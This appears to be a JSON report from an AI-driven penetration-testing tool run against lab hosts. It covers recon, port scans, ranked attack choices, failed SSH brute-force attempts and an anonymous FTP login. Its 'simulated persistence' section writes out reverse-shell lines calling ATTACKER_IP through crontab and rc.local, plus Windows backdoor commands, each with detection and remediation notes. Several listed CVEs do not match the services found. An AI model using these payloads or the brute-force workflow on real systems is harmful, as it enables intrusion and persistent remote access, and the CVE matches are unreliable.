@@ -1,0 +1,283 @@
+{
+  "target": "10.129.2.252",
+  "recon": {
+    "dns": {
+      "A": [],
+      "MX": [],
+      "NS": [],
+      "TXT": []
+    },
+    "whois": {
+      "registrar": null,
+      "creation_date": null,
+      "expiration_date": null,
+      "emails": "abuse@iana.org",
+      "org": null
+    },
+    "subdomains": [],
+    "shodan": {},
+    "timestamp": "2026-02-20T19:15:07.771482"
+  },
+  "scan_results": {
+    "21": {
+      "service": "ftp",
+      "version": "3.0.3",
+      "banner": "220 (vsFTPd 3.0.3)",
+      "os_guess": "Linux 4.15 - 5.19",
+      "cves": [
+        {
+          "cve_id": "CVE-2008-4723",
+          "description": "Multiple cross-site scripting (XSS) vulnerabilities in Mozilla Firefox 3.0.1 through 3.0.3 allow remote attackers to inject arbitrary web script or HTML via an ftp:// URL for an HTML document within a (1) JPG, (2) PDF, or (3) TXT file.  NOTE: the provenance of this information is unknown; the detail",
+          "cvss_score": 4.3
+        }
+      ]
+    },
+    "22": {
+      "service": "ssh",
+      "version": "8.2p1 Ubuntu 4ubuntu0.2",
+      "banner": "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2",
+      "os_guess": "Linux 4.15 - 5.19",
+      "cves": []
+    },
+    "80": {
+      "service": "http",
+      "version": "",
+      "banner": "",
+      "os_guess": "Linux 4.15 - 5.19",
+      "cves": [
+        {
+          "cve_id": "CVE-1999-0236",
+          "description": "ScriptAlias directory in NCSA and Apache httpd allowed attackers to read CGI programs.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-1999-1068",
+          "description": "Oracle Webserver 2.1, when serving PL/SQL stored procedures, allows remote attackers to cause a denial of service via a long HTTP GET request.",
+          "cvss_score": 5.0
+        },
+        {
+          "cve_id": "CVE-1999-0071",
+          "description": "Apache httpd cookie buffer overflow for versions 1.1.1 and earlier.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-1999-0267",
+          "description": "Buffer overflow in NCSA HTTP daemon v1.3 allows remote command execution.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-1999-1207",
+          "description": "Buffer overflow in web-admin tool in NetXRay 2.6 allows remote attackers to cause a denial of service, and possibly execute arbitrary commands, via a long HTTP request.",
+          "cvss_score": 7.5
+        }
+      ]
+    }
+  },
+  "ai_decisions": [
+    {
+      "technique": "cve_check",
+      "mitre_id": "T1200",
+      "target_service": "http",
+      "target_port": 80,
+      "rationale": "High CVSS scores for multiple HTTP vulnerabilities",
+      "priority": 1
+    },
+    {
+      "technique": "cve_check",
+      "mitre_id": "T1200",
+      "target_service": "ftp",
+      "target_port": 21,
+      "rationale": "XSS vulnerability in FTP service",
+      "priority": 2
+    },
+    {
+      "technique": "ssh_brute",
+      "mitre_id": "T1110",
+      "target_service": "ssh",
+      "target_port": 22,
+      "rationale": "Common SSH brute force attack vector",
+      "priority": 3
+    },
+    {
+      "technique": "http_default_creds",
+      "mitre_id": "T1110",
+      "target_service": "http",
+      "target_port": 80,
+      "rationale": "Potential for default or weak HTTP credentials",
+      "priority": 4
+    },
+    {
+      "technique": "ftp_anon",
+      "mitre_id": "T1135",
+      "target_service": "ftp",
+      "target_port": 21,
+      "rationale": "Potential for anonymous FTP access",
+      "priority": 5
+    }
+  ],
+  "exploit_results": [
+    {
+      "technique": "ssh_brute",
+      "target": "192.168.56.102",
+      "port": 22,
+      "success": false,
+      "result": "No valid credentials found",
+      "mitre_id": "T1110.001",
+      "timestamp": "2026-02-20T14:50:38.080132"
+    },
+    {
+      "technique": "http_default_creds",
+      "target": "192.168.56.102",
+      "port": 80,
+      "success": false,
+      "result": "No default creds worked",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T14:50:38.189231"
+    },
+    {
+      "technique": "ftp_anon",
+      "target": "192.168.56.102",
+      "port": 21,
+      "success": true,
+      "result": "Anonymous login OK \u2014 files: ",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T14:50:38.241045"
+    },
+    {
+      "technique": "ssh_brute",
+      "target": "192.168.56.102",
+      "port": 22,
+      "success": false,
+      "result": "No valid credentials found",
+      "mitre_id": "T1110.001",
+      "timestamp": "2026-02-20T15:15:08.668898"
+    },
+    {
+      "technique": "http_default_creds",
+      "target": "192.168.56.102",
+      "port": 80,
+      "success": false,
+      "result": "No default creds worked",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T15:15:09.852048"
+    },
+    {
+      "technique": "ftp_anon",
+      "target": "192.168.56.102",
+      "port": 21,
+      "success": true,
+      "result": "Anonymous login OK \u2014 files: ",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T15:15:11.249871"
+    },
+    {
+      "technique": "http_default_creds",
+      "target": "192.168.56.102",
+      "port": 80,
+      "success": false,
+      "result": "No default creds worked",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T15:24:28.633002"
+    },
+    {
+      "technique": "ftp_anon",
+      "target": "192.168.56.102",
+      "port": 21,
+      "success": true,
+      "result": "Anonymous login OK \u2014 files: ",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T15:24:28.704049"
+    },
+    {
+      "technique": "ssh_brute",
+      "target": "192.168.56.102",
+      "port": 22,
+      "success": false,
+      "result": "No valid credentials found",
+      "mitre_id": "T1110.001",
+      "timestamp": "2026-02-20T15:24:50.012239"
+    },
+    {
+      "technique": "ssh_brute",
+      "target": "10.129.2.252",
+      "port": 22,
+      "success": false,
+      "result": "No valid credentials found",
+      "mitre_id": "T1110.001",
+      "timestamp": "2026-02-20T19:17:29.349911"
+    },
+    {
+      "technique": "http_default_creds",
+      "target": "10.129.2.252",
+      "port": 80,
+      "success": false,
+      "result": "No default creds worked",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T19:17:32.016938"
+    },
+    {
+      "technique": "ftp_anon",
+      "target": "10.129.2.252",
+      "port": 21,
+      "success": false,
+      "result": "530 Login incorrect.",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T19:17:35.883662"
+    }
+  ],
+  "privesc_results": {
+    "message": "No SSH session available. Privesc checks require a valid session.",
+    "suid_binaries": [],
+    "sudo_misconfig": [],
+    "cron_jobs": [],
+    "writable_configs": []
+  },
+  "persistence_simulated": [
+    {
+      "technique": "Cron Job Persistence",
+      "mitre_id": "T1053.003",
+      "simulated": true,
+      "payload_string": "* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+      "target_file": "/etc/crontab",
+      "detection": "Monitor /etc/crontab for unauthorized modifications",
+      "remediation": "Audit cron jobs weekly. Use cron.allow/deny restrictions.",
+      "timestamp": "2026-02-20T13:47:36.223746"
+    },
+    {
+      "technique": "RC.local Startup Script",
+      "mitre_id": "T1037.004",
+      "simulated": true,
+      "payload_string": "#!/bin/bash\n/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\nexit 0",
+      "target_file": "/etc/rc.local",
+      "detection": "Monitor /etc/rc.local for unauthorized changes; check file integrity with AIDE/Tripwire.",
+      "remediation": "Disable rc.local execution or restrict write access. Use systemd service hardening.",
+      "timestamp": "2026-02-20T13:47:36.223781"
+    },
+    {
+      "technique": "Registry Run Key",
+      "mitre_id": "T1547.001",
+      "simulated": true,
+      "payload_string": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"cmd.exe\"",
+      "target_file": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "detection": "Monitor registry Run/RunOnce keys for new or modified values using Sysmon (Event ID 13).",
+      "remediation": "Restrict registry write access. Deploy endpoint detection (EDR) with Run-key monitoring.",
+      "timestamp": "2026-02-20T13:47:36.223791"
+    },
+    {
+      "technique": "Startup Folder",
+      "mitre_id": "T1547.001",
+      "simulated": true,
+      "payload_string": "copy backdoor.exe \"C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe\"",
+      "target_file": "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
+      "detection": "Monitor Startup folder contents for new executables; use Autoruns for auditing.",
+      "remediation": "Restrict write access to Startup folders. Use AppLocker / WDAC to block unsigned executables.",
+      "timestamp": "2026-02-20T13:47:36.223799"
+    }
+  ],
+  "session_info": {
+    "technique": "ftp_anon",
+    "port": 21,
+    "target": "192.168.56.102"
+  },
+  "report_generated": "2026-02-20T19:17:45.602741"
+}
